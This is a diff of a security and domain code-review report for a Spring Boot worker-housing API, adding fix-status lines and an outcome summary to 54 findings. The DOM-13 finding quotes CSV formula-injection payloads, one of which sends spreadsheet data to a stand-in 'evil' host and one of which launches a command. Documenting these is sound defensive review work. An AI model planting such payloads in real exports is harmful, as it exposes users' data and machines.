@@ -5,6 +5,35 @@
 > cross-checked by an orchestrating session. No source file was modified during the review; one
 > throw-away integration test was executed to confirm DOM-01 and then deleted.
 
+## Outcome
+
+All 54 findings were addressed between commits `7b83349` and `7d82aca` (2026-09-14). Each carries a
+`- **Status:**` line naming the commit; where the fix differs from the suggestion above, or leaves
+something deliberately undone, the status line says so. The ones worth knowing without reading
+further:
+
+- **DOM-01** was fixed with the representable-sentinel option, not the null-aware predicate. HQL
+  renders `:p IS NULL` as a bare `? IS NULL`, which PostgreSQL rejects outright ("could not
+  determine data type"); the reason is recorded on the queries so it is not retried.
+- **DOM-02**'s migration (`V15`) **refuses to apply** over data that already violates the new
+  exclusion constraints, naming the counts. The V12 backfill can leave exactly such rows, so a
+  production deploy may need them resolved first; `GET /properties/{id}/exceptions` now reports
+  them as `BED_CONFLICT`. Repairing them automatically is a data decision, not a migration's.
+- **SEC-03** was resolved by *narrowing* `bulk-checkout` (dropping AGENCY_PLANNER) as well as
+  widening the single-stay operations to AGENCY_ADMIN. The contradiction had two possible fixes;
+  this is the one that does not grant anybody new power.
+- **SEC-02** leaves `GET /stays` and `GET /properties` as agency-wide lists. Every per-property
+  path is scoped; the two collection endpoints are filtered by tenant only, and a client scopes
+  them with `?propertyId=`.
+- **SEC-14(f)** (two DTO shapes for a user) is deliberately not done: changing the login payload
+  is a frontend-visible break with no defect behind it.
+- The rendered cloud-init blob now sits at **15984 of EC2's 16384 bytes**. Comments added to
+  `deploy/docker-compose.prod.yml`, `deploy/Caddyfile` or `deploy/boot.sh` come out of that
+  budget, and `render-user-data.py` fails the build when it is exceeded.
+
+Two migrations were added (`V15` overlap constraints, `V16` token version) and the Spring Boot BOM
+moved from 3.4.4 to 3.5.16. The suite now runs 315 tests, green including checkstyle.
+
 ## How to use this document
 
 This file is the work queue for whoever addresses the findings. Each finding has a stable id
@@ -112,6 +141,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** Admin deactivates a former front-desk employee → that person POSTs `/api/v1/auth/login` with their old email/password → 200 with fresh tokens. Even without re-login, their existing refresh token keeps minting new 7-day refresh tokens (`refresh()` loads the user by id and re-issues), so access never expires.
 - **Suggested fix:** In `AuthService.login` throw `UnauthorizedException("error.auth.invalid_credentials")` when `user.getStatus() != UserStatus.ACTIVE` (same code as bad password, so no enumeration), and in `refresh` throw `error.auth.invalid_refresh_token` for the same condition. That bounds a deactivated user's access to the remaining life of one access token (≤ 1 h). Pair with SEC-05 for immediate revocation. Add `shouldReturnUnauthorized_whenUserIsInactive` for both endpoints.
 - **Confidence:** HIGH
+- **Status:** fixed in f0d3489
 
 #### SEC-02 — Property scoping (`assignedPropertyIds`) is not enforced on stays, occupancy, inspection, or exports
 - **Severity:** HIGH
@@ -125,6 +155,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** FRONT_DESK token with `properties=[A]` → `POST /api/v1/stays/{stayAtPropertyB}/check-in` → 200. Same for check-out, move, no-show, `GET /properties/B/inspection`, `GET /properties/B/occupancy/export`.
 - **Suggested fix:** This is a documented, roadmapped gap (README.md:374-380, docs/api-specification.md:135-142, roadmap slice S-08 `enforce-property-scoping`, trip-wire tests in `StayGuardIntegrationTest`). Filed so the merged report is complete; fix it as S-08, not piecemeal: add a `PropertyAccessGuard.require(UUID propertyId)` in `common/security` that reads the principal from `SecurityContextHolder` and throws `ForbiddenException("error.property.access_denied")` for PROPERTY_ADMIN/FRONT_DESK outside their list; call it in `StayService` after `getStayOrThrow` (and on `request.propertyId()` for create/bulk-assign, on the target room's property for move), and at the top of every `OccupancyService`/`ExportService` method. Flip the trip-wire tests to expect 403.
 - **Confidence:** HIGH
+- **Status:** fixed in 0047213 — enforced via SecurityUtils.requirePropertyAccess at each path's single funnel; PropertyScopingIntegrationTest covers the matrix. Note `GET /stays` and `GET /properties` remain agency-wide lists; pass `?propertyId=` to scope them.
 
 #### SEC-03 — Role sets on check-in/out/move/no-show and inspection deny AGENCY_ADMIN, contradicting the README and the bulk-checkout rule
 - **Severity:** MEDIUM
@@ -138,6 +169,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** The bootstrap AGENCY_ADMIN (the only account on a fresh deployment) cannot check anyone in or out until they create a FRONT_DESK user; a planner who cannot `POST /stays/{id}/check-out` can `POST /stays/bulk-checkout` with `stayIds=[id]`.
 - **Suggested fix:** Decide the matrix once. Most likely: add `AGENCY_ADMIN` to check-in/no-show/check-out/move and to the two inspection endpoints, and align `bulk-checkout` with `check-out` (same role set). Otherwise fix README.md:369 and the "PROPERTY_ADMIN only" notes to state the exclusion explicitly. Add one 403/200 assertion per changed endpoint.
 - **Confidence:** HIGH that code and docs contradict; MEDIUM on which side is intended (no role matrix exists in `docs/api-specification.md`).
+- **Status:** fixed in 0047213 — AGENCY_ADMIN added to check-in/out/no-show/move and both inspection endpoints; bulk-checkout narrowed to check-out's role set, dropping AGENCY_PLANNER.
 
 #### SEC-04 — AGENCY_PLANNER can read every user's email and role through the audit log, although `/users` is admin-only
 - **Severity:** MEDIUM
@@ -155,6 +187,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** PLANNER → `GET /api/v1/audit?entityType=USER&size=1000` → full roster of staff emails and roles, including admins.
 - **Suggested fix:** In `AuditService.findAll`, when the caller's role is not AGENCY_ADMIN, exclude `AuditEntityType.USER` (add an `excludeEntityType` parameter to `AuditRepository.findAllWithFilters`, or reject `entityType=USER` with 403 and filter it out of unfiltered queries). Add a test that a PLANNER never receives a USER event.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### SEC-05 — Refresh tokens are never rotated or revocable
 - **Severity:** MEDIUM
@@ -166,6 +199,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** A refresh token leaks from a device → attacker keeps a live session for 7 days no matter what the user or admin does; combined with SEC-01 the session is permanent.
 - **Suggested fix:** New migration adding `users.token_version INT NOT NULL DEFAULT 0`; include `tv` in refresh (and optionally access) claims; in `refresh()` reject when `claim.tv != user.getTokenVersion()`; increment it in `UserService.deactivate`, on any future password change/logout. Minimal state, no token table.
 - **Confidence:** HIGH
+- **Status:** fixed in e1ca26c — V16 adds users.token_version, carried as the `tv` claim and checked on refresh; deactivation bumps it. Access tokens still live out their hour, which is inherent to the stateless design.
 
 #### SEC-06 — Creating or updating a user without `language` produces a 500 (NOT NULL violation; no `DataIntegrityViolationException` handler)
 - **Severity:** MEDIUM
@@ -180,6 +214,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** `POST /api/v1/users {"email":..,"password":..,"firstName":..,"lastName":..,"role":"FRONT_DESK"}` → 500 with a stack trace in the log; `PUT` without `language` nulls out an existing user's language → 500.
 - **Suggested fix:** `@NotBlank` on `language` in both DTOs (or default in `UserService.create`/`update`). Independently, add an `@ExceptionHandler(DataIntegrityViolationException.class)` → 409 `CONFLICT`/`error.conflict` in `GlobalExceptionHandler` as the backstop for unique-constraint races (`uq_users_email`, room number, bed label) that the pre-checks cannot close.
 - **Confidence:** HIGH
+- **Status:** fixed in ae7dfb3
 
 #### SEC-07 — Unsanctioned unscoped `findAllById` in `ExportService`; the sanctioned `OccupancyService.loadWorkers` exception is now unnecessary
 - **Severity:** MEDIUM
@@ -199,6 +234,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** No exposure today. A future refactor that feeds `bedLabelById` ids from a request body (e.g. an export filter) would silently return other agencies' bed labels.
 - **Suggested fix:** Add `List<Bed> findAllByAgencyIdAndIdIn(UUID agencyId, Collection<UUID> ids)` to `BedRepository` and use it with `TenantContext.requireAgencyId()`; switch `loadWorkers` to `workerRepository.findAllByAgencyIdAndIdIn(agencyId, workerIds)`; remove the `OccupancyService.loadWorkers` entry from CLAUDE.md/AGENTS.md. Add `AuthService.refresh`/`getCurrentUser` to the sanctioned list (they run before/without a tenant context) or scope `/me` via `findByIdAndAgencyId(userId, currentUser.agencyId())`.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b
 
 #### SEC-08 — Core auth flow and the user-guard edge cases have no integration coverage
 - **Severity:** MEDIUM
@@ -213,6 +249,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** SEC-01, SEC-05, SEC-09 all regress silently; a refactor of `AuthService.login` that breaks successful login passes CI.
 - **Suggested fix:** Add to `AuthIntegrationTest`: `shouldIssueTokens_whenCredentialsAreValid` (insert a user with `passwordEncoder.encode`), `shouldReturnUnauthorized_whenPasswordIsWrong`, `shouldIssueNewPair_whenRefreshTokenIsValid`, `shouldReturnUnauthorized_whenUserIsInactive` (login and refresh), `shouldReturnUnauthorized_whenAccessTokenIsExpired` (set `accessTokenExpirationMs=-1000` on a local `JwtConfig`), `shouldReturnUnauthorized_whenTokenSignedWithOtherKey`. Add to `UserIntegrationTest`: last-admin role change → 409, self status INACTIVE via PUT, cross-agency PUT/DELETE → 404. Add `AuditIntegrationTest` with role gating and cross-agency isolation.
 - **Confidence:** HIGH
+- **Status:** fixed in f0d3489 and a888bdf
 
 #### SEC-09 — `UserService.update` bypasses the self-deactivation guard that `deactivate` enforces
 - **Severity:** LOW
@@ -223,6 +260,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** Admin PUTs their own user with `status: INACTIVE` while another admin exists → 200; harmless today only because of SEC-01, and exactly the lock-out `deactivate` was written to prevent once SEC-01 is fixed.
 - **Suggested fix:** In `update`, before mutation: `if (user.getId().equals(currentUserId()) && request.status() == UserStatus.INACTIVE) throw new ConflictException("error.user.cannot_deactivate_self");` plus a test.
 - **Confidence:** HIGH
+- **Status:** fixed in f0d3489
 
 #### SEC-10 — Login timing reveals whether an email is registered
 - **Severity:** LOW
@@ -233,6 +271,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** 10 req/min/IP is slow but sufficient to confirm a handful of guessed staff addresses per hour.
 - **Suggested fix:** Keep a static `DUMMY_HASH = new BCryptPasswordEncoder().encode("x")` and always run `passwordEncoder.matches(request.password(), user.map(User::getPasswordHash).orElse(DUMMY_HASH))` before deciding.
 - **Confidence:** HIGH
+- **Status:** fixed in f0d3489
 
 #### SEC-11 — Bootstrap and Seed runners have no defined order; seed-first silently skips bootstrap
 - **Severity:** LOW
@@ -245,6 +284,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** Fresh prod deploy with both flags on → demo agency exists, real agency/admin never created, operator sees only an INFO line.
 - **Suggested fix:** `@Order(1)` on `BootstrapRunner`, `@Order(2)` on `SeedRunner`; or make bootstrap's guard `userRepository.existsByEmail(properties.getAdminEmail())` so it is independent of seed data.
 - **Confidence:** HIGH on the mechanism; MEDIUM on whether Spring happens to order them Bootstrap-first today (component-scan order is not a contract).
+- **Status:** fixed in e1ca26c
 
 #### SEC-12 — Prod "structured JSON" log lines are not JSON whenever an exception or newline is logged
 - **Severity:** LOW
@@ -255,6 +295,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** Every `log.error("Unhandled exception", ex)` from `GlobalExceptionHandler` yields a multi-line, unparseable record, i.e. exactly the lines an aggregator must not drop.
 - **Suggested fix:** Use `logstash-logback-encoder`'s `LogstashEncoder` (adds MDC fields and a properly escaped `stack_trace`), or at minimum append `%nopex` and emit `"ex":"%replace(%ex){...}"` as its own escaped field.
 - **Confidence:** HIGH
+- **Status:** fixed in e1ca26c
 
 #### SEC-13 — Scheduler status transitions bypass the audit trail
 - **Severity:** LOW
@@ -266,6 +307,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** The next event on the stay (check-in) shows `previousState.status=EXPECTED_TODAY` with nothing recording when or why it left PLANNED.
 - **Suggested fix:** Log one `UPDATED` event per stay with `actorUserId=null`, `reason="scheduler"`, using `s.getAgencyId()`; or document the exclusion in `docs/api-specification.md` §12 if intentional.
 - **Confidence:** HIGH on the fact; MEDIUM on whether it is intended.
+- **Status:** fixed in 0f56dcc
 
 #### SEC-14 — Dead code, triple JWT verification per request, duplicated scoping helper, double filter registration
 - **Severity:** LOW
@@ -280,6 +322,7 @@ design changes, then tests and docs. Effort is a rough size for a single focused
 - **Failure scenario:** None functional; maintenance cost and a small per-request CPU tax.
 - **Suggested fix:** Delete the bean and the repository method; in `TenantFilter` parse once inside a `try/catch (JwtException | IllegalArgumentException)` and branch on the `type` claim; cache the `SecretKey` in a `JwtTokenProvider` field (`@PostConstruct` or constructor); move the check to `CurrentUser.requirePropertyAccess(UUID)` throwing `ForbiddenException`; add `FilterRegistrationBean` with `setEnabled(false)` for both filters; reuse `UserResponse` from `/auth/me`.
 - **Confidence:** HIGH
+- **Status:** fixed in e1ca26c and 0047213 — all six items: dead bean and repository method removed, key cached and the token parsed once per request, the scope helper consolidated into CurrentUser.requirePropertyAccess, duplicate filter registration disabled. (f) is deliberately left: AuthResponse.UserInfo and UserResponse stay separate shapes, since changing the login payload is a frontend-visible break with no defect behind it.
 
 Also noted (not filed):
 - `POST /users` returns 409 `error.user.email_exists` for an email that exists in another agency: a one-bit cross-tenant existence probe, admin-only, and a direct consequence of the documented global-unique-email design (`V8__unique_user_email.sql`, `UserIntegrationTest.shouldRejectDuplicateEmail` exercises it deliberately).
@@ -322,6 +365,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** `POST /stays {dateTo: null}` on a bed that already has a stay `[today, +30d)`. The wrapped millis are hugely negative; on pgjdbc's default binary DATE path they clamp to `-infinity`, `s.dateFrom < -infinity` is false for every row, count = 0, and the open-ended stay is created on the occupied bed (same for the worker's double-booking check). On the text path PostgreSQL instead rejects the year as out of range → 500. Either outcome is wrong; no test creates a stay with `dateTo = null` anywhere in `src/test` (grep found none), so this has never been exercised.
 - **Suggested fix:** Drop the sentinel: make the JPQL null-aware (`AND (:dateTo IS NULL OR s.dateFrom < :dateTo)`) in the four `count…` queries, or use a representable far-future date (`LocalDate.of(9999, 12, 31)`) in a shared `StayDates.effectiveEnd(...)` helper. Add `BedAssignmentIntegrationTest.shouldRejectOpenEndedStay_whenBedOccupied` and `StayIntegrationTest.shouldRejectOpenEndedStay_whenWorkerAlreadyBooked`.
 - **Confidence:** HIGH — the reviewer verified the binding path from bytecode (MEDIUM at the time); the orchestrator then executed the scenario and observed the 500 (see the verification note above).
+- **Status:** fixed in 7b83349
 
 #### DOM-02 — Bed assignment and worker double-booking are only application-level checks; concurrent requests can double-book
 - **Severity:** HIGH
@@ -334,6 +378,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Two planners submit `POST /stays` for the same room with `bedId = null` at the same moment (or two `bulk-assign` calls); both `resolveBed` loops see bed "1" free, both insert → two PLANNED stays on one bed; `GET /exceptions` will not flag it either (see DOM-09). Same race for one worker in two rooms. Separately, two simultaneous `check-in` calls on one stay collide on `@Version` and the loser gets `ObjectOptimisticLockingFailureException`, which `GlobalExceptionHandler` maps to 500, not 409.
 - **Suggested fix:** Add a DB-level guard (migration): `CREATE EXTENSION btree_gist; ALTER TABLE stays ADD CONSTRAINT excl_stays_bed_period EXCLUDE USING gist (bed_id WITH =, daterange(date_from, COALESCE(date_to, 'infinity'::date), '[)') WITH &&) WHERE (status IN ('PLANNED','EXPECTED_TODAY','CHECKED_IN'))`, and the analogous one on `worker_id`; map the resulting `DataIntegrityViolationException` to 409/422. Cheaper interim: `@Lock(PESSIMISTIC_WRITE)` on `BedRepository.findAllByAgencyIdAndRoomId`/`findByIdAndAgencyIdAndRoomId` and on the worker lookup used by write paths, so concurrent writers serialize on the bed/worker rows. Add a handler for `ObjectOptimisticLockingFailureException` → 409.
 - **Confidence:** HIGH
+- **Status:** fixed in 14748e3 — V15 adds gist exclusion constraints on (bed_id, period) and (worker_id, period). The migration refuses to install over data that already conflicts, which the V12 backfill can leave behind; resolving those rows is a data decision and stays with the operator.
 
 #### DOM-03 — Check-in without `bedId` silently re-auto-assigns the bed, discarding the planner's explicit choice
 - **Severity:** HIGH
@@ -354,6 +399,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Planner creates a stay with explicit `bedId` = bed "3" (`bedAutoAssigned=false`) because beds "1"/"2" are reserved for later arrivals not yet planned. Front desk checks the worker in with `{}` (the documented minimal body): `resolveBed` excludes the stay itself, finds bed "1" free, and the stay is rewritten to bed "1" with `bedAutoAssigned=true`. The printed arrivals CSV (`Bed` column) now disagrees with the system. `OperationalWorkflowIntegrationTest.shouldCheckIn_whenStayIsExpectedToday` never asserts `bedId` is unchanged, so this is untested.
 - **Suggested fix:** In `checkIn`, when `request.bedId() == null` and `request.roomId()` is null or equals `stay.getRoomId()`, keep `stay.getBedId()`: load it via `bedRepository.findByIdAndAgencyIdAndRoomId(stay.getBedId(), agencyId, room.getId())` and build `new BedAssignment(bed, stay.isBedAutoAssigned())`; only auto-assign when the room actually changes. Consider the same "keep unless changed" rule in `update` (a notes-only PUT currently reshuffles the bed). Add `shouldKeepPlannedBed_whenCheckInHasNoBedOverride`.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### DOM-04 — `PLANNED → EXPECTED_TODAY` happens only in a once-a-day sweep keyed on `dateFrom = today`; same-day plans, past-dated plans and any missed run leave stays un-check-in-able
 - **Severity:** HIGH
@@ -367,6 +413,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** At 10:00 a planner creates a stay for a worker arriving tonight (`dateFrom = today`). It never appears in `GET /stays/arrivals`, and `POST /stays/{id}/check-in` returns 409 `error.stay.invalid_status_transition` forever; the only workaround is a DB update (which is exactly what every integration test does via `forceExpectedToday`). Likewise any stay whose `dateFrom` passed while the instance was stopped.
 - **Suggested fix:** (1) Change the sweep to a catch-up: `WHERE s.status = PLANNED AND s.dateFrom <= :date` (keep it cross-tenant, already sanctioned). (2) Run `transitionPlannedToExpectedToday(today)` once at startup (`ApplicationReadyEvent`) in addition to the cron. (3) Either allow `PLANNED → CHECKED_IN` when `dateFrom <= today`, or promote synchronously in `create`/`update` when `dateFrom <= today`. (4) Pin the zone: `@Scheduled(cron = "...", zone = "${beduno.time-zone:Europe/Warsaw}")` and inject a `Clock` bean used by every `LocalDate.now()` in `StayService`, `StayController`, `RoomService`, `OccupancyController`. Add a `StaySchedulerTest`/service test — `transitionPlannedToExpectedToday` is currently never called by any test.
 - **Confidence:** HIGH
+- **Status:** fixed in 0f56dcc
 
 #### DOM-05 — Stay dates are never validated; `dateTo <= dateFrom` reaches the `chk_stays_dates` CHECK and surfaces as 500
 - **Severity:** HIGH
@@ -379,6 +426,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** `POST /stays` with `dateFrom = 2026-09-20, dateTo = 2026-09-20` (a one-night misunderstanding) → engine passes → INSERT fails → `INTERNAL_ERROR`. `POST /check-out {actualDateTo: <dateFrom>}` (worker left the day he arrived) → 500 and no check-out. In `bulk-assign` the failing INSERT is deferred to the next item's auto-flush, so the whole batch dies (see DOM-07).
 - **Suggested fix:** Add a class-level `@AssertTrue` (e.g. `isDateRangeValid() { return dateTo == null || dateTo.isAfter(dateFrom); }`) on `CreateStayRequest`, `UpdateStayRequest` and `BulkAssignRequest.Assignment`; in `checkOut` reject `actualDateTo <= stay.getDateFrom()` with `ValidationException("error.stay.invalid_dates")`; and add a `DataIntegrityViolationException → 409/400` handler as a safety net. Tests: `shouldReturnBadRequest_whenDateToNotAfterDateFrom` for create/update/bulk/check-out.
 - **Confidence:** HIGH
+- **Status:** fixed in ae7dfb3
 
 #### DOM-06 — Room/property consistency is not enforced on any write path; a mismatched stay disappears from every occupancy view
 - **Severity:** HIGH
@@ -389,6 +437,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Check-in with `roomId` from property B on a stay of property A (or a client bug sending the wrong `propertyId`). Occupancy/inspection/exceptions for A fetch the stay (`propertyId = A`) but drop it because `staysByRoom` has no matching room in A; views for B never fetch it. The worker is checked in but visible nowhere, and the bed in B is counted free by nobody except the constraint engine. The API spec already documents this as a caveat; the code still allows it.
 - **Suggested fix:** In `StayService`, replace `getRoomOrThrow(roomId, agencyId)` on write paths with `roomRepository.findByIdAndAgencyIdAndPropertyId(roomId, agencyId, propertyId).orElseThrow(() -> new NotFoundException("error.room.not_found"))` (the method already exists on `RoomRepository`); in `checkIn`/`move` use `stay.getPropertyId()` as the property. Add `shouldRejectCreate_whenRoomBelongsToOtherProperty` and the check-in/move variants.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### DOM-07 — Bulk assign/checkout are neither atomic nor per-item: any persistence-level failure poisons the transaction, blames the wrong item and ends in a 500 that discards all "created" rows
 - **Severity:** MEDIUM
@@ -405,6 +454,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** 20 assignments, item 7 has `dateTo == dateFrom` (DOM-05). Items 0–6 are reported "created"; item 8's `getWorkerOrThrow` query flushes item 7's INSERT, which fails; item 8 is recorded as `"error"` with a raw PostgreSQL message; the transaction is rollback-only; the client receives 500 and nothing was persisted. `BulkOperationsIntegrationTest` only covers business-level failures (constraint/404), never a persistence-level one.
 - **Suggested fix:** Decide and document the contract. For true per-item semantics move the per-item body into a separate bean method annotated `@Transactional(propagation = REQUIRES_NEW)` (self-invocation will not work), and `flush()` inside it. Regardless, in the catch use `e instanceof BusinessException be ? be.getMessageCode() : "error.internal"`, `log.warn` the exception, and validate inputs (DOM-05) so DB failures cannot originate from user input.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### DOM-08 — A CHECKED_IN stay whose `dateTo` has passed vanishes from occupancy and frees its bed while the worker is still checked in
 - **Severity:** MEDIUM
@@ -416,6 +466,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Worker A is CHECKED_IN in bed 1, planned `dateTo` = yesterday, never checked out (common: extended contract). Today `GET /occupancy` shows bed 1 empty, `GET /inspection` omits A (the inspector reports him as `UNEXPECTED_PRESENT`), `POST /stays` for worker B on bed 1 from today passes `BedOccupancyConstraint`, and B can be checked in → two CHECKED_IN workers in one bed with no exception raised.
 - **Suggested fix:** Treat `CHECKED_IN` as occupying through `GREATEST(date_to, :date + 1)`: in the occupancy/inspection query use `AND (s.dateTo IS NULL OR s.dateTo > :date OR s.status = CHECKED_IN)`, and in `countActiveStaysInBed*` add `OR s.status = CHECKED_IN` to the end-date clause. Add an `OVERSTAY` exception type in `OccupancyService.getExceptions` for CHECKED_IN stays with `dateTo <= date`. Test: `shouldStillShowCheckedInWorker_whenPlannedDateToHasPassed`.
 - **Confidence:** HIGH
+- **Status:** fixed in 44afdcf — a CHECKED_IN stay occupies through today whatever its planned dateTo says, in occupancy views and overlap counts alike. Bounded to today on purpose: a booking that starts later is still governed by the stay's own dates.
 
 #### DOM-09 — The `OVER_CAPACITY` safety net is room-level and cannot detect the bed-level violations the system now cares about
 - **Severity:** MEDIUM
@@ -426,6 +477,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Room with beds 1, 2 (ACTIVE). Stays A and B both CHECKED_IN on bed 1 (backfilled data, or a race). `GET /exceptions` returns nothing; the occupancy board shows both in the room with the same `bedLabel` and the reader has to notice.
 - **Suggested fix:** Group `checkedIn` by `bedId`; emit `OVER_CAPACITY` (or a new `BED_CONFLICT`) when any bed has more than one CHECKED_IN stay, and `BED_BLOCKED_OCCUPIED` when a CHECKED_IN stay's bed is BLOCKED or missing from the room. Add `shouldReturnException_whenTwoWorkersCheckedInOnSameBed` (seed via `jdbcTemplate` as the existing tests do).
 - **Confidence:** HIGH
+- **Status:** fixed in 44afdcf
 
 #### DOM-10 — Check-in writes the audit "previous" snapshot after mutating the stay, so a room/bed override never shows in the audit trail
 - **Severity:** MEDIUM
@@ -443,6 +495,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Front desk checks a worker into a different room than planned. The `CHECKED_IN` audit event has `previousState.roomId == newState.roomId`; the planned room is unrecoverable from the trail even though the API spec points auditors there (`confirmed_by_user_id … read it from the audit trail`).
 - **Suggested fix:** Move `var previous = snapshot(stay);` above the first mutation (right after `runConstraints`). Add an assertion on `previousState.roomId` in `shouldCheckIn_withRoomOverride` via `GET /audit`.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### DOM-11 — Same-room move with auto-assign is refused whenever the worker already holds the lowest free bed
 - **Severity:** MEDIUM
@@ -453,6 +506,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Worker in bed "1" of a 4-bed room, beds 2–4 free. `POST /move {targetRoomId: <same room>, targetBedId: null}` → 409, although the documented contract is "a move to a different bed in the same room now succeeds". `shouldMoveToNewBed_whenSameRoomDifferentBed` only covers the explicit-bed case.
 - **Suggested fix:** Pass an `excludeBedId` into `resolveBed` (or filter `candidates` with `!bed.getId().equals(stay.getBedId())` when `targetRoom.getId().equals(stay.getRoomId())`). Test: `shouldMoveToNextFreeBed_whenSameRoomAutoAssign`.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### DOM-12 — Worker CSV import: unvalidated column lengths turn into deferred DB failures that blame the next row and lose the whole import
 - **Severity:** MEDIUM
@@ -464,6 +518,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Row 12 has a 120-character `firstName`. Row 13's duplicate check flushes row 12's INSERT → `value too long` → row 13 is reported as `row_failed`, the transaction is rollback-only, and the request ends in 500 with zero workers created and no `errorDetails` delivered.
 - **Suggested fix:** Validate lengths per row before `save` (reject with a new `error.worker.import.field_too_long`), or run the parsed rows through the same Bean Validation as `CreateWorkerRequest` (`Validator.validate(new CreateWorkerRequest(...))`). Narrow the outer catch to `IOException`. Also note `log.warn("... {}", e.getMessage())` can echo row content (date of birth) into logs, contrary to the "never log PII" rule.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b
 
 #### DOM-13 — CSV exports are vulnerable to formula injection and mis-escape `\r`
 - **Severity:** MEDIUM
@@ -474,6 +529,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** A worker imported with `lastName = =HYPERLINK("http://evil/"&A1,"open")` (or `=cmd|' /C calc'!A0`) appears in every occupancy/exception export and executes on open. A `\r` inside `notes`-like fields is not applicable here, but a room number containing `\r` splits the row.
 - **Suggested fix:** In `escapeCsvField`, when the first character is one of `= + - @ \t \r`, prefix the value with `'` (or a tab) and always quote; add `\r` to the quoting condition. Consider writing a UTF-8 BOM so Excel renders the PL/UA/RU headers. Add an `ExportIntegrationTest` case with a room number `=1+1` and a name containing `,` and `"` — today only header rows are tested.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b
 
 #### DOM-14 — Soft-deleting a worker leaves PLANNED/EXPECTED_TODAY/CHECKED_IN stays active and orphans the bed
 - **Severity:** MEDIUM
@@ -485,6 +541,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Admin deletes a worker who has an open-ended PLANNED stay next month. The bed stays reserved forever (no one can be placed on it; auto-assign skips it), the arrivals list will show a worker who cannot be checked in (404 on the worker inside check-in), and the planner cannot `PUT` the stay to fix it either.
 - **Suggested fix:** In `WorkerService.delete`, either refuse with 409 `error.worker.has_active_stays` when `stayRepository.countActiveByWorker(...) > 0`, or cancel PLANNED/EXPECTED_TODAY stays and refuse only for CHECKED_IN. Test: `shouldRejectDelete_whenWorkerHasActiveStay`.
 - **Confidence:** HIGH
+- **Status:** fixed in 44afdcf
 
 #### DOM-15 — Inspection report: duplicate `roomId` entries throw `IllegalStateException` (500); duplicate worker ids duplicate discrepancies
 - **Severity:** MEDIUM
@@ -496,6 +553,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** The mobile inspector app sends the same room twice (two partial scans) → `Duplicate key …` → `INTERNAL_ERROR`. Sending `[w1, w1]` for a room where `w1` is not expected yields two `UNEXPECTED_PRESENT` items.
 - **Suggested fix:** Merge on collision (`(a, b) -> concat`), convert `presentWorkerIds` to a `Set`, and call `propertyService.getPropertyOrThrow(propertyId)` at the top of the four `OccupancyService` methods (and in `ExportService`). Test: `shouldMergeDuplicateRoomEntries_whenReportRepeatsARoom`.
 - **Confidence:** HIGH
+- **Status:** fixed in 44afdcf
 
 #### DOM-16 — Unbounded batch sizes and a numeric-label overflow
 - **Severity:** MEDIUM
@@ -508,6 +566,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** `POST .../beds/bulk-generate {count: 5000000}` from any PROPERTY_ADMIN pins the instance (1 GB heap) in one transaction; a bed renamed to `99999999999999999999` makes the room's bulk-generate permanently 500.
 - **Suggested fix:** `@Max(200)` on `count`, `@Size(max = 500)` on the two lists; in `highestNumericLabel` use `label.matches("\\d{1,9}")` or catch `NumberFormatException` and ignore.
 - **Confidence:** HIGH
+- **Status:** fixed in ae7dfb3
 
 #### DOM-17 — `PUT /stays/{id}` on an EXPECTED_TODAY stay does not reconcile status with the new `dateFrom`
 - **Severity:** MEDIUM
@@ -518,6 +577,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Arrival postponed by a week: planner PUTs `dateFrom = today + 7`. The stay stays `EXPECTED_TODAY`, so `check-in` is permitted today (status allows it) and `getArrivals` on the new date lists it only because status happens to match, while for the intervening week `GET /stays?status=EXPECTED_TODAY` reports a phantom arrival.
